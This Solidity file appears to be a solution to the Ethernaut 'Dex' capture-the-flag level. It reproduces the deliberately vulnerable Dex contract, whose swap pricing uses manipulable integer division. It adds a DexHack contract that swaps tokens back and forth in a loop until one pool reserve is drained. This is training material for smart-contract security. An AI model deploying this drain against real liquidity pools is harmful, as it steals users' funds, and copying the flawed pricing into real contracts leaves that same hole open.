// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "forge-std/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Dex is Ownable {
    address public token1;
    address public token2;

    // 项目仓库是oz v5，level使用的 oz 是 v4.9，Ownable初始化方式不一样
    // 这里微调，以适配本地环境
    constructor() Ownable(msg.sender) {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function addLiquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableToken(token1).approve(msg.sender, spender, amount);
        SwappableToken(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableToken is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}

interface DexI {
    function token1() external view returns (address);
    function token2() external view returns (address);
    // function setTokens(address _token1, address _token2) external;
    // function addLiquidity(address token_address, uint256 amount) external;
    function swap(address from, address to, uint256 amount) external;
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

contract DexHack {
    DexI public dex;

    constructor(address _dex) {
        dex = DexI(_dex);
        dex.approve(address(_dex), 100000);
    }

    function loopCall() public {
        for (uint256 i = 0; i < 50; ++i) {
            address t1 = dex.token1();
            address t2 = dex.token2();
            uint256 b1d = dex.balanceOf(t1, address(dex));
            uint256 b2d = dex.balanceOf(t2, address(dex));
            uint256 b1 = dex.balanceOf(t1, address(this));
            uint256 b2 = dex.balanceOf(t2, address(this));

            // console.log("Loop i", i);
            // console.log("token1 balance\t%d\t%d", b1, b1d);
            // console.log("token2 balance\t%d\t%d", b2, b2d);

            if (b1d == 0 || b2d == 0) {
                return;
            }

            uint256 swapAmt = b1;
            if (b1 >= b2) {
                // 拿b1全部换b2
                uint256 b2x = dex.getSwapPrice(t1, t2, b1);
                if (b2x > b2d) {
                    swapAmt = b2d * b1d / b2d;
                }
                // console.log("1->2: %d->%d", swapAmt, dex.getSwapPrice(t1, t2, swapAmt));
                dex.swap(t1, t2, swapAmt);
            } else {
                swapAmt = b2;
                // 拿 token2 全部换 token1
                uint256 b1x = dex.getSwapPrice(t2, t1, b2);
                if (b1x > b1d) {
                    swapAmt = b1d * b2d / b1d;
                }
                // console.log("2->1: %d->%d", swapAmt, dex.getSwapPrice(t2, t1, swapAmt));
                dex.swap(t2, t1, swapAmt);
            }
        }
    }
}
